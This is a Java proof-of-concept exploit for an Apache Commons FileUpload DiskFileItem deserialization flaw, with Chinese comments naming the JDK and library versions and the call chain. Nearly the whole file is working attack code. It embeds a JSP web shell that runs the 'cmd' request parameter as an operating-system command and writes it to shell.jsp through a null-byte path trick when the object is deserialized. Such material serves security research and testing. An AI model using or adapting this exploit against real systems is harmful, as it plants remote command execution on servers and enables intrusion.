import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;

import java.io.File;

import java.lang.reflect.Field;

import static util.Util.serialize;
import static util.Util.unserialize;
/*
* JDK版本jdk1.7u17,路径使用\0不会报错
*调用链：
* DiskFileItem.readObject()
*   DiskFileItem.getOutputStream()
*版本依赖：
* commons-fileupload1.2.1
* commons-io 2.4
*
*
* */
public class FileUpload1 {
    public static void main(String[] args) throws Exception{
        String charset="UTF-8";
        byte[] bytes   = "<% java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a; byte[] b=new byte[1024]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){out.println(new String(b,0,a));}%>".getBytes(charset);
        File repository =new File("src/main/webapp/shell.jsp\0");
        DeferredFileOutputStream dfos=new DeferredFileOutputStream(0,repository);
        DiskFileItem diskFileItem =new DiskFileItem(null,null,false,null,0,repository);

        Field dfosFile =DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem,dfos);

        Field field2 = DiskFileItem.class.getDeclaredField("cachedContent");
        field2.setAccessible(true);
        field2.set(diskFileItem,bytes);
        serialize(diskFileItem);
        unserialize();
    }
}
